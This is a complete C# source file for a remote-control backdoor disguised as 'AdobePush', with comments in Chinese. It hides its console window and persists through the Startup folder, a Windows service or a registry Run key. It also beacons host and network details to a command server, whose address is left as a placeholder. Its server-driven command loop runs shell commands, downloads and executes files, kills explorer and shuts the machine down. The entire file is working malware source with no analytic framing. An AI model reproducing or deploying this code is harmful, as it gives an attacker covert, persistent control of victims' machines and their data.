using System;
using System.IO;
using System.Net;
using System.Text;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Runtime.InteropServices;

using SimpleJSON;

namespace RemoteControl
{
	public static class Cryptos
	{
        public static String EncodingConvert(String FromString, Encoding FromEncoding, Encoding ToEncoding)
        {
            byte[] FromBytes = FromEncoding.GetBytes(FromString);
            byte[] ToBytes = Encoding.Convert(FromEncoding, ToEncoding, FromBytes);
            return ToEncoding.GetString(ToBytes);
        }
        public static String GBK2UTF8(String Strings)
        {
            Encoding FromEncoding = Encoding.GetEncoding("GB2312");
            Encoding ToEncoding = Encoding.UTF8;
            return EncodingConvert(Strings, FromEncoding, ToEncoding);
        }
        public static String UTF82GBK(String Strings)
        {
            Encoding FromEncoding = Encoding.UTF8;
            Encoding ToEncoding = Encoding.GetEncoding("GB2312");
            return EncodingConvert(Strings, FromEncoding, ToEncoding);
        }
		public static String Base64_Encode(String Strings)
		{
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(Strings));
        }
		public static String Base64_Decode(String Strings)
		{
            return Encoding.UTF8.GetString(Convert.FromBase64String(Strings));
        }
	}
    public static class Configs
    {
        // Developer 为开发模式，Production 为生产模式
        public static String Enviroments = "6AKlOU1ks04drtVCeMTQJ_3";

        // 窗口名称
        public static String WIN_TITLE = "AdobePush";

        // 服务器配置
        public static String CFG_RUN = "6AKlOU1ks04drtVCeMTQJ_4"; // Startup 为移动到开始菜单中，Service 为以服务的形式启动，Registry 为添加注册表启动
        public static String CFG_SH = "6AKlOU1ks04drtVCeMTQJ_1"; // 服务器地址
        public static String CFG_SEC = "6AKlOU1ks04drtVCeMTQJ_2"; // 服务器 SEC 秘钥
        public static String CFG_ACK = ""; // ACK 身份识别码，无需填写

        // 目录配置
        public static String PATH_DOWNLOAD = "D:\\DOWNLOADER.TMP"; // 下载保存路径
        public static String PATH_CONFIGS = "C:\\Users\\Public\\Intel"; // 配置文件保存路径
        public static String PATH_MODELS = "C:\\Users\\Public\\Intel\\Models"; // 模块保存路径
        public static String PATH_EXECUTE = "D:\\EXECUTE.EXE";

        public static Random M = new Random();

        public static Char GetRandomChar()
        {
            int Ret = M.Next(122);
            while (Ret < 48 || (Ret > 57 && Ret < 65) || (Ret > 90 && Ret < 97))
            {
                Ret = M.Next(122);
            }
            return (char)Ret;
        }
        public static String GetRandomString(int Length)
        {
            StringBuilder Strings = new StringBuilder(Length);
            for (int i = 0; i < Length; i++)
            {
                Strings.Append(GetRandomChar());
            }
            return Strings.ToString();
        }
        public static void Init()
        {
            try
            {
                String Path = Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)).FullName;
                if (Environment.OSVersion.Version.Major >= 6)
                {
                    Path = Directory.GetParent(Path).ToString();
                }
                String RunPath = Process.GetCurrentProcess().MainModule.FileName;
                switch (CFG_RUN)
                {
                    case "Startup":
                        if (RunPath != Path + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AdobePush.exe")
                        {
                            if (!File.Exists(Path + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AdobePush.exe"))
                            {
                                File.Copy(RunPath, Path + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AdobePush.exe");
                            }
                        }
                        break;
                    case "Service":
                        if (RunPath != "C:\\Windows\\AdobePush.exe")
                        {
                            if (!File.Exists("C:\\Windows\\AdobePush.exe"))
                            {
                                File.Copy(RunPath, "C:\\Windows\\AdobePush.exe");
                                Handler.RunCMD("sc create AdobePush binpath= \"C:\\Windows\\AdobePush.exe\"", false);
                                Handler.RunCMD("sc config AdobePush start= AUTO", false);
                            }
                        }
                        break;
                    case "Registry":
                        if (RunPath != "C:\\Windows\\AdobePush.exe")
                        {
                            if (!File.Exists("C:\\Windows\\AdobePush.exe"))
                            {
                                File.Copy(RunPath, "C:\\Windows\\AdobePush.exe");
                                RegistryKey RKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                                if (RKey == null) RKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                                RKey.SetValue("AdobePush", "C:\\Windows\\AdobePush.exe");
                            }
                        }
                        break;
                    default:
                        break;
                }
                if (!Directory.Exists(PATH_CONFIGS))
                {
                    Directory.CreateDirectory(PATH_CONFIGS);
                    CFG_ACK = GetRandomString(32);
                    StreamWriter fFile = new StreamWriter(PATH_CONFIGS + "\\Config.json");
                    fFile.Write(CFG_ACK);
                    fFile.Close();
                }
                else
                {
                    if (File.Exists(PATH_CONFIGS + "\\Config.json"))
                    {
                        StreamReader fFile = new StreamReader(PATH_CONFIGS + "\\Config.json");
                        CFG_ACK = fFile.ReadToEnd();
                        fFile.Close();
                    }
                    else
                    {
                        CFG_ACK = GetRandomString(32);
                        StreamWriter fFile = new StreamWriter(PATH_CONFIGS + "\\Config.json");
                        fFile.Write(CFG_ACK);
                        fFile.Close();
                    }
                }
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex);
            }
        }
    }
    public static class Handler
    {
        public static String HTTP_POST(String URL, NameValueCollection Param)
        {
            String Response = "";
            using (WebClient Client = new WebClient())
            {
                byte[] ResponseBytes = Client.UploadValues(URL, "POST", Param);
                Response = Encoding.UTF8.GetString(ResponseBytes);
            }
            return Response;
        }
        public static String GetSIP()
        {
            return new IPAddress(Dns.GetHostByName(Dns.GetHostName()).AddressList[0].Address).ToString();
        }
        public static JSONNode GetCommands()
        {
            String Response = "";
            try
            {
                NameValueCollection Param = new NameValueCollection(); ;
                Param.Add("SEC", Configs.CFG_SEC);
                Param.Add("ACK", Configs.CFG_ACK);
                Param.Add("SIP", GetSIP());
                Param.Add("HOT", Dns.GetHostName());
                Param.Add("IPC", Cryptos.Base64_Encode(RunCMD("ipconfig /all", false)));
                Response = HTTP_POST(Configs.CFG_SH + "/Api/Commands/Get", Param);
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex);
                Response = "{\"RIP\":\"0.0.0.0\",\"RES\":[]}";
                return JSON.Parse(Response)["RES"];
            }
            return JSON.Parse(Response)["RES"];
        }
        public static Boolean FinCommands(String CID, String RES)
        {
            String Response = "";
            try
            {
                NameValueCollection Param = new NameValueCollection(); ;
                Param.Add("SEC", Configs.CFG_SEC);
                Param.Add("ACK", Configs.CFG_ACK);
                Param.Add("CID", CID);
                Param.Add("RES", Cryptos.Base64_Encode(RES));
                Response = HTTP_POST(Configs.CFG_SH + "/Api/Commands/Fin", Param);
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex);
                return false;
            }
            return true;
        }
        public static String RunCMD(String Info, Boolean Encrypt)
        {
            if (Encrypt) Info = Cryptos.Base64_Decode(Info);
            Process P = new Process();
            P.StartInfo.FileName = "cmd.exe";
            P.StartInfo.UseShellExecute = false;
            P.StartInfo.RedirectStandardInput = true;
            P.StartInfo.RedirectStandardOutput = true;
            P.StartInfo.RedirectStandardError = true;
            P.StartInfo.CreateNoWindow = true;
            P.Start();
            P.StandardInput.WriteLine(Info + " & exit");
            P.StandardInput.AutoFlush = true;
            String Output = P.StandardOutput.ReadToEnd();
            P.WaitForExit();
            P.Close();
            return Cryptos.GBK2UTF8(Output);
        }
        public static String ShellExecute(String Info, Boolean Encrypt)
        {
            if (Encrypt) Info = Cryptos.Base64_Decode(Info);
            try
            {
                Process.Start(Info);
            }
            catch (Exception Ex)
            {
                return Ex.ToString();
            }
            return "执行成功！";
        }
        public static String Downloader(String Info, Boolean Encrypt)
        {
            if (Encrypt) Info = Cryptos.Base64_Decode(Info);
            try
            {
                WebClient Client = new WebClient();
                Client.DownloadFile(Info, Configs.PATH_DOWNLOAD);
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex);
                return Ex.ToString();
            }
            return "执行成功！";
        }
        public static String Downloader2Execute(String Info, Boolean Encrypt)
        {
            if (Encrypt) Info = Cryptos.Base64_Decode(Info);
            try
            {
                String Response = Downloader(Info, false);
                if (Response == "执行成功！")
                {
                    File.Move(Configs.PATH_DOWNLOAD, Configs.PATH_EXECUTE);
                    return ShellExecute(Configs.PATH_EXECUTE, true);
                }
                else
                {
                    return Response;
                }
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex);
                return Ex.ToString();
            }
        }
        public static String RebootExplorer(String Info, Boolean Encrypt)
        {
            try
            {
                RunCMD("taskkill /F /IM explorer.exe", false);
                ShellExecute("explorer.exe", false);
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex);
                return Ex.ToString();
            }
            return "执行成功！";
        }
        public static String ShutdownExplorer(String Info, Boolean Encrypt)
        {
            try
            {
                RunCMD("taskkill /F /IM explorer.exe", false);
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex);
                return Ex.ToString();
            }
            return "执行成功！";
        }
        public static String StartExplorer(String Info, Boolean Encrypt)
        {
            try
            {
                ShellExecute("explorer.exe", false);
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex);
                return Ex.ToString();
            }
            return "执行成功！";
        }
        public static String Reboot(String Info, Boolean Encrypt)
        {
            if (Encrypt) Info = Cryptos.Base64_Decode(Info);
            int WaitTime = int.Parse(Info) + 10;
            Info = WaitTime.ToString();
            return RunCMD("shutdown /r /t " + Info, false);
        }
        public static String Shutdown(String Info, Boolean Encrypt)
        {
            if (Encrypt) Info = Cryptos.Base64_Decode(Info);
            int WaitTime = int.Parse(Info) + 10;
            Info = WaitTime.ToString();
            return RunCMD("shutdown /s /t " + Info, false);
        }
    }
    public static class Program
    {
        [DllImport("user32.dll", EntryPoint = "ShowWindow", SetLastError = true)]
        static extern bool ShowWindow(IntPtr hWnd, uint nCmdShow);
        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        public static extern IntPtr FindWindow(String lpClassName, String lpWindowName);

        public static Boolean HideWindow(String WindowTitle)
        {
            try
            {
                IntPtr intptr = FindWindow("ConsoleWindowClass", WindowTitle);
                if (intptr != IntPtr.Zero)
                {
                    ShowWindow(intptr, 0);
                }
            }
            catch
            {
                return false;
            }
            return true;
        }
        public static void RunApplication()
        {
            while (1 == 1)
            {
                foreach (KeyValuePair<String, JSONNode> Row in Handler.GetCommands())
                {
                    String Cid = Row.Value["cid"];
                    String Act = Row.Value["act"];
                    String Tex = Row.Value["tex"];
                    String Res = "";
                    switch (Act)
                    {
                        case "RunCMD":
                            Res = Handler.RunCMD(Tex, true);
                            break;
                        case "ShellExecute":
                            Res = Handler.ShellExecute(Tex, true);
                            break;
                        case "Downloader":
                            Res = Handler.Downloader(Tex, true);
                            break;
                        case "Downloader2ShellExecute":
                            Res = Handler.Downloader2Execute(Tex, true);
                            break;
                        case "RebootExplorer":
                            Res = Handler.RebootExplorer(Tex, true);
                            break;
                        case "ShutdownExplorer":
                            Res = Handler.ShutdownExplorer(Tex, true);
                            break;
                        case "StartExplorer":
                            Res = Handler.StartExplorer(Tex, true);
                            break;
                        case "Reboot":
                            Res = Handler.Reboot(Tex, true);
                            break;
                        case "Shutdown":
                            Res = Handler.Shutdown(Tex, true);
                            break;
                        default:
                            break;
                    }
                    Handler.FinCommands(Cid, Res);
                }
                Thread.Sleep(10000);
            }
        }
        public static int Main(String[] args)
        {
            Console.Title = Configs.WIN_TITLE;
            if (Configs.Enviroments == "Production") HideWindow(Configs.WIN_TITLE);

            Configs.Init();
            try
            {
                RunApplication();
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex);
                Console.ReadLine();
            }
            return 0;
        }
    }
}